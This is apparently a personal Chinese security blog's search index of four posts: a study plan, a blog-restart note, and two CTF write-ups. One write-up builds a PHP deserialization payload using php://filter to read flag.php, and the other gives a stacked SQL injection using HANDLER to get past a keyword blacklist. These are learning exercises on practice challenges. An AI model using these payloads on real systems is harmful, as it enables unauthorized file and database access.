<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>11月学习计划</title>
    <url>/2021/11/05/11%E6%9C%88%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>从去年开始接触安全，到现在，很多东西仍然是一知半解。</p>
<p>之前的学习方式也有些 “面向笔记学习“ 的感觉，”做了笔记就说明我学了“，这样的想法未免可笑。</p>
<p>既然想要做渗透，精通python才能不沦为“脚本小子”；后端开发也是我本学期要自学的，否则在团队里真的无作用了。</p>
<p>本月目标：</p>
<ul>
<li>《Python基础教程》</li>
<li>《Java核心技术卷一》</li>
</ul>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>规划</tag>
      </tags>
  </entry>
  <entry>
    <title>[网鼎杯 2020 青龙组]AreUSerialz</title>
    <url>/2021/11/11/1/</url>
    <content><![CDATA[<blockquote>
<p>平台：<a href="https://buuoj.cn/">https://buuoj.cn/</a></p>
</blockquote>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>代码审计题，先看传入的参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[&#x27;str&#x27;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>必须要通过is_valid函数才能够反序列化，那我们再看is_valid函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i = 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里规定了字符串的每个字符的ASCII码范围都应该在32-125之间</p>
<p>我们现在去看反序列化，执行__destruct()函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果op赋值字符串2会被更改</p>
<p>再看process函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function process() &#123;</span><br><span class="line">        if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>$this-&gt;op == “2”是个弱类型比较，可以通过给op赋值数字2的方法绕过</p>
<p>再看read函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>题目中包含了flag.php，因此我们可以使用php伪协议</p>
<p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler&#123;</span><br><span class="line">	protected $op = 2;</span><br><span class="line">	protected $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">	protected $content = &quot;Hello World!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new FileHandler();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"># O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;*op&quot;;i:2;s:11:&quot;*filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:10:&quot;*content&quot;;s:12:&quot;Hello World!&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>生成后发现一个问题，*的ascii码值不在32-125之间，更改一下属性为public</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler&#123;</span><br><span class="line">	public $op = 2;</span><br><span class="line">	public $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">	public $content = &quot;Hello World!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new FileHandler();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"># O:11:%22FileHandler%22:3:&#123;s:2:%22op%22;i:2;s:8:%22filename%22;s:57:%22php://filter/read=convert.base64-encode/resource=flag.php%22;s:7:%22content%22;s:12:%22Hello%20World!%22;&#125;</span><br></pre></td></tr></table></figure>

<p>传入参数得到回显，base64解码即可得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Result]:</span><br><span class="line">PD9waHAgJGZsYWc9J2ZsYWd7OTEzZWM1NTAtYzI3Yi00OTQ5LWE3ZWEtZmE5MmU4MjE3MDAwfSc7Cg==</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF日常练习</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>[GYCTF2020]Blacklist</title>
    <url>/2021/11/10/GYCTF2020/</url>
    <content><![CDATA[<blockquote>
<p>平台：<a href="https://buuoj.cn/">https://buuoj.cn/</a></p>
</blockquote>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>很显然是sql注入，打开页面后回显</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>用一些常用的命令看看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show databases;%23</span><br><span class="line">1&#x27;;show tables;%23</span><br><span class="line">select</span><br></pre></td></tr></table></figure>

<p>得到两个有用的信息：</p>
<ol>
<li><p>flag在FlagHere内</p>
</li>
<li><p>过滤了以下关键字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure></li>
</ol>
<p>但是没有过滤handler</p>
<p>因此这里可以这样堆叠注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;%23</span><br></pre></td></tr></table></figure>



<h3 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HANDLER ... OPEN语句打开一个表，使其后续可以使用HANDLER ... READ语句访问。该表对象未被其他会话共享，并且在会话调用HANDLER ... CLOSE或会话终止之前不会关闭</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF日常练习</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>sql注入</tag>
        <tag>堆叠注入</tag>
      </tags>
  </entry>
  <entry>
    <title>新的起点</title>
    <url>/2021/10/31/%E6%96%B0%E7%9A%84%E8%B5%B7%E7%82%B9/</url>
    <content><![CDATA[<p>严格地说，这是我的第三个博客。</p>
<p>第一个博客搭建在zsq大佬的服务器上，我基本没有操作；第二个博客搭建在阿里赠送的云服务器上，写了两篇文章后便置之不理。</p>
<p>29日的秋期考核让我意识到我必须做出一些改变了。博客既是我成长的记录，也是我成长的辅助。今天，就是新的起点。</p>
<p>不要做被世界改变的人，要做改变世界的人。    ——Derait·Buendia</p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>随记</tag>
      </tags>
  </entry>
</search>
